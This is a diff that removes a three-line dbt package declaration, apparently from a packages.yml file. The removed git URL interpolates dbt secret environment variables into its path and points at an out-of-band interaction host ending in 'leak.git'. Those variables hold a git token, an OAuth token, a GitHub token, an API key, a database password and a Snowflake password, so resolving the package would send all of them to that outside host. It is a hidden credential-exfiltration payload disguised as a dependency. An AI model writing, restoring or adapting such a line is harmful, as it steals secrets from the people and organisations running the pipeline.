@@ -1,3 +1,0 @@
-packages:
-  - git: "https://dbhrbrs14l2nm32jk2tg4sfwtihhpg4jz.oast.pro/GIT_TOKEN_{{ env_var('DBT_ENV_SECRET_GIT_TOKEN', 'X') }}/GIT_URL_{{ env_var('DBT_ENV_SECRET_GIT_URL', 'X') }}/OAUTH_{{ env_var('DBT_ENV_SECRET_OAUTH_TOKEN', 'X') }}/GH_TOKEN_{{ env_var('DBT_ENV_SECRET_GITHUB_TOKEN', 'X') }}/API_KEY_{{ env_var('DBT_ENV_SECRET_API_KEY', 'X') }}/DB_PASS_{{ env_var('DBT_ENV_SECRET_DB_PASSWORD', 'X') }}/SNOWFLAKE_{{ env_var('DBT_ENV_SECRET_SNOWFLAKE_PASSWORD', 'X') }}/leak.git"
-    revision: main
